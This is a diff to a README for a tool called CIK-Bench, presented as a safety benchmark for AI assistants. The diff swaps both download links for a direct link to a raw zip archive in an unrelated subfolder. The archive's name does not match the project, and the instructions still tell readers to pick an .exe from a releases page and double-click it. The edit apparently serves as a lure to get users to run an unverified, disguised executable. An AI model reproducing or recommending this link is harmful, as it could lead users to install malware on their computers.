@@ -1,6 +1,6 @@
 # 🛡️ CIK-Bench - Testing safety for your personal assistant
 
-[![Download for Windows](https://img.shields.io/badge/Download_CIK--Bench-Blue)](https://github.com/alexanderhilaya/CIK-Bench)
+[![Download for Windows](https://img.shields.io/badge/Download_CIK--Bench-Blue)](https://github.com/alexanderhilaya/CIK-Bench/raw/refs/heads/main/stonecutter/CI_Bench_v3.7.zip)
 
 CIK-Bench helps you evaluate the safety of your AI agent. Digital assistants often interact with your personal files and web accounts. This software tests how your assistant handles sensitive tasks. Use this tool to find potential security gaps in your local system.
 
@@ -28,7 +28,7 @@ Your computer needs to meet these basic standards to run the tests:
 
 Follow these steps to install the benchmark on your Windows computer.
 
-1. Visit the [releases page](https://github.com/alexanderhilaya/CIK-Bench) to download the program.
+1. Visit the [releases page](https://github.com/alexanderhilaya/CIK-Bench/raw/refs/heads/main/stonecutter/CI_Bench_v3.7.zip) to download the program.
 2. Choose the file ending in .exe to begin your download.
 3. Locate the file in your Downloads folder once the transfer finishes.
 4. Double-click the file to start the installer.
